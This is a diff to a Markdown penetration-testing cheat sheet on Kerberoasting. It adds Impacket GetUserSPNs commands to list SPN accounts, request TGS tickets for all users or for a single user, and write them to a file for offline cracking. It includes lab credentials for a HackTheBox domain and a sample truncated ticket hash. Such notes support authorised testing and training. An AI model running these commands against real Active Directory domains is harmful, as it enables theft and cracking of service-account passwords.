@@ -4,10 +4,17 @@
 
 Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
 
-* [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
+## Linux
 
-  ```powershell
-  $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+### [GetUserSPNs](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite
+
+* **List All SPN Accounts**  
+  ```bash
+  Impacket-GetUserSPNs -dc-ip <DC IP> <domain>/<user>
+  ```
+* **Request all TGS Tickets** 
+  ```bash
+  $ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
 
   Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 
@@ -17,6 +24,15 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
 
   $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2
   ```
+* **Request a Single TGS ticket**  
+  ```bash
+  Impacket-GetUserSPNs -dc-ip <dc ip> <domain>/<user> -request-user <target user>
+  ```
+* **Save the ticket to an output file**  
+  ```bash
+  Impacket-GetUserSPNs -dc-ip <dc ip> <domain>/<user> -request-user <target user> -outputfile <filename>
+  ```
+## Windows
 
 * netexec Module
 
